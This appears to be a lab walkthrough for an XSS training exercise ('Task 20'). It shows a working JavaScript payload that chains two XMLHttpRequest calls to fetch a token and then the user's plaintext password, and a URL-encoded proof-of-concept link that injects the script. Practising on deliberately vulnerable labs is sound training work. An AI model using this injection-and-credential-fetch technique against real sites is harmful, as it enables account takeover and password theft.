## Task 20 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/20)</small>

Objectives:

1. Find John's Password using an XSS vulnerability on this page
1. Display the Password in the div with id "result"
1. App stores password in Plain Text :(
1. No Hardcoded values can be used - everything has to be figured out dynamically

So in this when I checked the source code, I found the 2 apis. Yep, again lengthy payload 🤦

![](https://i.ibb.co/HdJNwD9/image.png)

Also the gettoken is in JSON

![](https://i.ibb.co/nj6NwNv/image.png)

Luckily we have [XMLHttpRequest.responseType](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseType) which will parse the JSON string as soon as the request response body is returned 😄

So let's use the XHR and complete this task

```js
let uid = document.querySelector("a").innerText.trim().slice(-4);

const xhr1 = new XMLHttpRequest();
xhr1.responseType = "json";

xhr1.onreadystatechange = function () {
  if (this.status == 200 && this.readyState == 4) {
    const xhr2 = new XMLHttpRequest();
    xhr2.responseType = "json";

    xhr2.onreadystatechange = function () {
      if (this.status == 200 && this.readyState == 4) {
        document.querySelector("#result").innerText = this.response.resp.password;
      }
    };
    xhr2.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/20/getpassword?token=" + this.response.params.token, true);
    xhr2.send();
  }
};
xhr1.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/20/gettoken?uid=" + uid, true);
xhr1.send();
```

In XHR, the parsed JSON response is accessed via [XMLHttpRequest.response](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/response)

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/20?url=%3Cscript%3Elet%20uid%20%3D%20document.querySelector%28%22a%22%29.innerText.trim%28%29.slice%28-4%29%3B%0A%0Aconst%20xhr1%20%3D%20new%20XMLHttpRequest%28%29%3B%0Axhr1.responseType%20%3D%20%22json%22%3B%0A%0Axhr1.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.status%20%3D%3D%20200%20%26%26%20this.readyState%20%3D%3D%204%29%20%7B%0A%20%20%20%20const%20xhr2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20xhr2.responseType%20%3D%20%22json%22%3B%0A%0A%20%20%20%20xhr2.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20%20%20%20%20if%20%28this.status%20%3D%3D%20200%20%26%26%20this.readyState%20%3D%3D%204%29%20%7B%0A%20%20%20%20%20%20%20%20document.querySelector%28%22%23result%22%29.innerText%20%3D%20this.response.resp.password%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%3B%0A%20%20%20%20xhr2.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F20%2Fgetpassword%3Ftoken%3D%22%20%2B%20this.response.params.token%2C%20true%29%3B%0A%20%20%20%20xhr2.send%28%29%3B%0A%20%20%7D%0A%7D%3B%0Axhr1.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F20%2Fgettoken%3Fuid%3D%22%20%2B%20uid%2C%20true%29%3B%0Axhr1.send%28%29%3B%3C%2Fscript%3E)
